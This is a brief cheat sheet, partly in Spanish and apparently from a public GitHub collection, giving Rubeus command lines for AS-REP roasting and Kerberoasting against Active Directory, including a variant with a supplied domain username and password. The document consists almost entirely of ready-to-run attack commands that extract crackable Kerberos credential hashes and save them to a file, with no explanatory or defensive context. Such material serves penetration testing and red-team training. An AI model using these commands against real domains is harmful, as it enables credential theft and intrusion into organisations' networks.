# Rubeus Cheat Sheet

#### ASREPRoast Attack
```
Rubeus.exe asreproast /nowrap
```

#### Kerberoasting Attack
```
Rubeus.exe kerberoast /outfile:hash
```

#### Kerberoasting Attack especificando usuario y contraseña de un usuario
```
Rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:<PASSWORD> /outfile:hash
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)